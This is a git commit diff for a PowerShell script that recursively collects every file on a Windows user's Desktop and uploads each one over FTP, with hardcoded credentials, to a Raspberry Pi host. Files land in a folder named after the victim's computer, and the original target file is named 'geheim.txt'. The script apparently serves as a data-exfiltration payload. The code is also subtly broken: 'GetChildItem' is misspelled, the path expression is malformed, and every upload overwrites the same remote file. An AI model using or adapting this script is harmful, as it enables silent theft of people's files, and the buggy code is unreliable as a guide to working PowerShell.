76a4582d04c328a0c76c9390a8ac55ecd35b6e1f
Leon Schlote <leonschlote@gmail.com>
2019-05-27 10:49:27 +0200

    upload multiple files in loop

--- public/upload_files.ps1
+++ public/upload_files.ps1
@@ -1,22 +1,28 @@
 # Config
 $Username = "ftpuser"
 $Password = "ftppass"
-$LocalFile = "C:\Users\testo\Desktop\geheim.txt"
-$RemoteFile = "ftp://raspberrypi.local/geheim.txt"
+$dir = "C:\Users\testo\Desktop\"
+$RemoteFile = "ftp://raspberrypi.local/$env:computername/geheim.txt"
 
-# Create FTP Rquest Object
-$FTPRequest = [System.Net.FtpWebRequest]::Create("$RemoteFile")
-$FTPRequest = [System.Net.FtpWebRequest]$FTPRequest
-$FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
-$FTPRequest.Credentials = new-object System.Net.NetworkCredential($Username, $Password)
-$FTPRequest.UseBinary = $true
-$FTPRequest.UsePassive = $true
-# Read the File for Upload
-$FileContent = gc -en byte $LocalFile
-$FTPRequest.ContentLength = $FileContent.Length
-# Get Stream Request by bytes
-$Run = $FTPRequest.GetRequestStream()
-$Run.Write($FileContent, 0, $FileContent.Length)
-# Cleanup
-$Run.Close()
-$Run.Dispose()
+$filelist = [string[]] (GetChildItem -Path $dir+"*.*" -Recurse)
+
+echo $filelist
+
+foreach($LocalFile in $filelist){
+  # Create FTP Rquest Object
+  $FTPRequest = [System.Net.FtpWebRequest]::Create("$RemoteFile")
+  $FTPRequest = [System.Net.FtpWebRequest]$FTPRequest
+  $FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+  $FTPRequest.Credentials = new-object System.Net.NetworkCredential($Username, $Password)
+  $FTPRequest.UseBinary = $true
+  $FTPRequest.UsePassive = $true
+  # Read the File for Upload
+  $FileContent = gc -en byte $LocalFile
+  $FTPRequest.ContentLength = $FileContent.Length
+  # Get Stream Request by bytes
+  $Run = $FTPRequest.GetRequestStream()
+  $Run.Write($FileContent, 0, $FileContent.Length)
+  # Cleanup
+  $Run.Close()
+  $Run.Dispose()
+}
